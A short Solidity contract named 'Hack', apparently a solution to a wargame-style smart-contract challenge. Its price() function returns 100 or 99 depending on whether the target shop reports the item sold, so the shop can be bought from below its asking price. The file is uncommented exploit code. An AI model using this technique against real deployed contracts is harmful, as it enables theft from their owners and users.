// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract Hack {
    IShop _Shop;

    constructor(address _address) {
        _Shop = IShop(_address);
    }

    function attack() external {
        _Shop.buy();
    }

    function price() external view returns (uint) {
        if (_Shop.isSold()) {
            return 99;
        }
        return 100;
    }
}
